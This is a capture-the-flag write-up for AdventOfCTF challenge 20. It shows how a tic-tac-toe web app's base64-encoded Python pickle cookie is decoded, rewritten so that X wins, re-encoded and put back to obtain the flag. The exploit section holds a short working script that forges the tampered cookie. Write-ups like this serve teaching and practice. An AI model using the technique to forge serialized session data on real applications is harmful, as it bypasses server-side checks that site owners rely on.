+++
author = "Maik de Kruif"
title = "Challenge 20"
subtitle = "Challenge 20 - AdventOfCTF"
date = 2021-02-26T00:11:35+01:00
description = "A writeup for challenge 20 of AdventOfCTF."
cover = "img/writeups/adventofctf/2020/c1f93b6ee2e1cd25ea02f9a78c364b12.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "python",
    "serialization",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 2000

## Description

To pass the time until Christmas the elves challenge Santa to a game of tic-tac-toe. Santa plays X, can you make him win?

Visit <https://20.adventofctf.com> to start the challenge.

## Recon

When looking around on the page, we can see a tic tac toe board with two links in it. These links direct to `/play/y/x` and place an `O` on the board. After placing it, `O` wins.

If we take a look at the source, we also find a bit of javascript:

```js
function send() {
  let emoji = $("#emoji")[0].value;
  if (emoji.length > 0) {
    $.post("/", { emoji: emoji }, function (data) {
      $("#msg")[0].innerHTML = "<b>" + data + "</b>";
    });
  }
}
```

This code doesn't seem to be used though and I don't see what it would be used for so we'll ignore it for now.

Lastly, we can check the cookies on the website. Here we can find the `game` cookie. It looks like it's some `base64` encoded data.

```text
game=gAN9cQAoWAUAAABib2FyZHEBXXECKF1xAyhYAQAAAE9xBGgETmVdcQUoaARYAQAAAFhxBmgGZV1xByhOaAZoBmVlWAQAAAB0dXJucQhoBFgIAAAAZmluaXNoZWRxCYlYBgAAAHdpbm5lcnEKTlgEAAAAc2FuZXELiHUu
```

## Finding the vulnerability

We will start by having a look at the `game` cookie. If we base64 decode it we do see some information about a board, but its not plain text.

```bash
echo -n "gAN9cQAoWAUAAABib2FyZHEBXXECKF1xAyhYAQAAAE9xBGgETmVdcQUoaARYAQAAAFhxBmgGZV1xByhOaAZoBmVlWAQAAAB0dXJucQhoBFgIAAAAZmluaXNoZWRxCYlYBgAAAHdpbm5lcnEKTlgEAAAAc2FuZXELiHUu" | base64 -d
```

```text
�}q(Xboardq]q(]q(XOqhNe]q(hXXqhe]q(NhheeXturnhfinishedq	�Xwinnerq
NXsaneq
       �u.⏎
```

By the looks of it, it might be a serialized object but we don't know where it came from.

To find out what the backend framework of the server is, we can look at the `Server` header in the http response. This is not always filled in with useful information, but this time it was.

```text
Server: Werkzeug/1.0.1 Python/3.7.10
```

Here we can see the website uses Python for the backend. This narrows the amount of possible serialization libraries down a lot. A common library used for this in Python is Pickle.

To test whether the cookie is encoded pickle data, we can use the pickle's `loads` function to import the data from a string:

```text
>>> import pickle
>>> import base64
>>> pickle.loads(base64.b64decode("gAN9cQAoWAUAAABib2FyZHEBXXECKF1xAyhYAQAAAE9xBGgETmVdcQUoaARYAQAAAFhxBmgGZV1xByhOaAZoBmVlWAQAAAB0dXJucQhoBFgIAAAAZmluaXNoZWRxCYlYBgAAAHdpbm5lcnEKTlgEAAAAc2FuZXELiHUu"))
{'board': [['O', 'O', None], ['O', 'X', 'X'], [None, 'X', 'X']], 'turn': 'O', 'finished': False, 'winner': '', 'sane': True}
```

Yes! It's using pickle and we can now try to alter the board.

## Exploit

To alter the board, we can write a little Python script like the following. You can't just put three `X` in a row as the backend checks the game state. To get around this, we can just place a few `O` on the board.

```py
import base64
import pickle

board_b64 = "gAN9cQAoWAUAAABib2FyZHEBXXECKF1xAyhYAQAAAE9xBGgETmVdcQUoaARYAQAAAFhxBmgGZV1xByhOaAZoBmVlWAQAAAB0dXJucQhoBFgIAAAAZmluaXNoZWRxCYlYBgAAAHdpbm5lcnEKTlgEAAAAc2FuZXELiHUu"

data = pickle.loads(base64.b64decode(board_b64))

data["board"] = [['X', 'X', 'X'], ['O', None, None], [None, None, 'O']]
data["winner"] = 'X'
data["turn"] = 'O'

print(base64.b64encode(pickle.dumps(data)))
```

```text
gASVVwAAAAAAAAB9lCiMBWJvYXJklF2UKF2UKIwBWJRoBGgEZV2UKIwBT5ROaAZlXZQoTk5OZWWMBHR1cm6UaAaMCGZpbmlzaGVklImMBndpbm5lcpRoBIwEc2FuZZSIdS4=
```

We can then replace the `game` cookie with this string and reload the page.

## Solution

We got the flag! It is `NOVI{p1ckle_r1ck}`.
